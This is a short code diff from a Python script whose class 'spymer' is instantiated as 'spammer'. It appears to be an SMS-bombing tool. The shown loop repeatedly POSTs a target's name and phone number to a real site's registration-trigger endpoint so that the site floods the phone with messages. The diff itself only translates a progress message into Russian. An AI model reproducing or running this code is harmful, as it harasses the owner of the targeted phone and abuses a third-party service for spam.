@@ -66,7 +66,7 @@ class spymer:
 			else:
 				smsint = requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone})
 			iteration += 1
-			print(('{} circle passed.').format(iteration))
+			print(('{} круг пройден.').format(iteration))
 
 spammer = spymer()
 spammer.main()
